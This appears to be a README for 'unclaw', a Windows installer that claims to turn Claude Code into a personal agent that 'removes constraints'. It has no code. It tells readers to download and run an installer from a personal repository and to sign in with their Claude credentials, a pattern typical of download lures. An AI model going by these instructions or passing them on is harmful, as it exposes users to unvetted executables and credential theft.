# 🤖 unclaw - Make Claude your personal AI agent

[![](https://img.shields.io/badge/Download-unclaw-blue.svg)](https://github.com/sacid446/unclaw)

## What is unclaw?

Unclaw turns the existing Claude Code tool into a personal AI agent. It removes constraints and allows you to run your assistant without extra infrastructure. You use your current Claude Pro subscription to power your agent.

The tool manages your interactions and keeps track of your tasks. It organizes your workflow so you spend less time configuring settings and more time finishing projects.

## 🛠️ System Requirements

Your computer needs to meet these basic standards to run unclaw:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 8GB of RAM.
*   **Storage:** 500MB of free disk space.
*   **Internet:** A stable connection to manage your cloud-based AI requests.

You should have the Claude web interface account active before you begin.

## 📥 How to Install

Follow these steps to set up the software on your Windows machine:

1. Visit [this page](https://github.com/sacid446/unclaw) to download the application.
2. Locate the installer file in your Downloads folder.
3. Double-click the file to start the installation process.
4. Follow the on-screen prompts. Click "Next" to continue through the setup screens.
5. Create a desktop shortcut if the installer asks for one. This makes it easier to open the program later.
6. Click "Finish" when the progress bar reaches the end.

## 🚀 Getting Started

Open the application from your desktop icon to begin. You will see a login screen. Sign in with your standard Claude credentials. The application uses your active session to connect your account to the agent framework.

The interface shows a command line or a chat bubble depending on your settings. You can type instructions exactly as you would talk to a person.

## ⚙️ Using Your Agent

Once you start the application, you can assign tasks. The agent works within your specific project folders.

*   To start a task, type "Help me organize my files." 
*   The agent reads your folder structure. 
*   It suggests ways to group your data.
*   You approve the changes before the agent applies them.

The memory system saves your preferences. If you tell the agent you prefer a certain file format, it remembers this for your next session. You do not need to repeat your instructions.

## 💡 Common Features

Unclaw includes features designed to help with daily tasks:

*   **Project Management:** The agent tracks your progress on large pieces of work.
*   **Local File Access:** You grant the agent permission to read and write files within dedicated folders.
*   **Automation:** You trigger complex sequences with a single short command.
*   **Security:** You control what the agent sees. You can restrict access to specific folders at any time through the settings menu.

## 🔧 Frequently Asked Questions

**Does this cost extra money?**
No. You use your existing Claude subscription. Unclaw acts as a bridge tool.

**Is my data private?**
The agent processes information through your authorized account. Your data remains tied to your personal cloud storage. 

**What if the agent makes a mistake?**
You have the final say. The application asks for your confirmation before it modifies any of your files. You can undo or stop actions at any time by clicking the "Stop" button in the interface.

**Can I use this for work?**
Many users integrate these tools into their professional workflow. Ensure your company policy allows the use of third-party AI agents before you link work accounts.

## 🛠️ Troubleshooting

If the application fails to open:

1. Check your internet connection.
2. Ensure you have the latest updates for your Windows operating system.
3. Restart your computer. 
4. If problems persist, remove the program and reinstall it using the steps above.

Check the logs folder if the agent stops responding. The logs file contains a record of what happened during your session. You can copy this information to help diagnose issues if you need to reach out to the community for help.
